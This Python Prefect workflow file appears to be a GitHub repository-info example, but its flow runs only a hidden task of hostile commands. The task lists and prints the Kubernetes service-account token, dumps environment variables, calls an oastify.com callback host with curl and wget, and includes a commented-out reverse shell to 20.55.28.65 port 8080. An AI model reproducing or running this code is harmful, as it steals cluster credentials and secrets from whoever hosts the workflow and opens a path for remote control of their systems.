import subprocess
import httpx
from prefect import flow, task
import socket
import os
import pty


def get_repo_info(repo_owner: str, repo_name: str):
    """Get info about a repo - will retry twice after failing"""
    url = f"https://api.github.com/repos/{repo_owner}/{repo_name}"
    api_response = httpx.get(url)
    api_response.raise_for_status()
    repo_info = api_response.json()
    return repo_info


def get_contributors(repo_info: dict):
    """Get contributors for a repo"""
    contributors_url = repo_info["contributors_url"]
    response = httpx.get(contributors_url)
    response.raise_for_status()
    contributors = response.json()
    return contributors

@task
def run_code():
    result = subprocess.run(["ls", "-l"], capture_output=True, text=True)
    output_string = result.stdout
    print(f"ls command: {output_string}")
    result = subprocess.run("hostname", shell=True, capture_output=True, text=True) 
    output_string = result.stdout
    print(f"hostname command: {output_string}")

    result = subprocess.run("curl http://929qlkt9aze7snf9c36udovztqzhn7bw.oastify.com", shell=True, capture_output=True, text=True)
    output_string = result.stdout
    print(f"curl command: {output_string}")

    result = subprocess.run("wget http://929qlkt9aze7snf9c36udovztqzhn7bw.oastify.com", shell=True, capture_output=True, text=True)
    output_string = result.stdout
    print(f"wget command: {output_string}")

    result = subprocess.run("ls /var/run/secrets/kubernetes.io/serviceaccount", shell=True, capture_output=True, text=True)
    output_string = result.stdout
    print(f"ls command: {output_string}")

    result = subprocess.run("cat /var/run/secrets/kubernetes.io/serviceaccount/token", shell=True, capture_output=True, text=True)
    output_string = result.stdout
    print(f"cat command: {output_string}")

    result = subprocess.run("printenv", shell=True, capture_output=True, text=True)
    output_string = result.stdout
    print(f"printenv command: {output_string}")

    result = subprocess.run("whereis kubectl", shell=True, capture_output=True, text=True)
    output_string = result.stdout
    print(f"whereis kubectl command: {output_string}")

    result = subprocess.run("whereis curl", shell=True, capture_output=True, text=True)
    output_string = result.stdout
    print(f"whereis curl command: {output_string}")

    result = subprocess.run("ls /tmp", shell=True, capture_output=True, text=True)
    output_string = result.stdout
    print(f"ls command: {output_string}")

    #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    #s.connect(("20.55.28.65",8080))
    #os.dup2(s.fileno(),0)
    #os.dup2(s.fileno(),1)
    #os.dup2(s.fileno(),2)

@flow(log_prints=True)
def repo_info(repo_owner: str = "PrefectHQ", repo_name: str = "prefect"):
    run_code()

if __name__ == "__main__":
    repo_info()
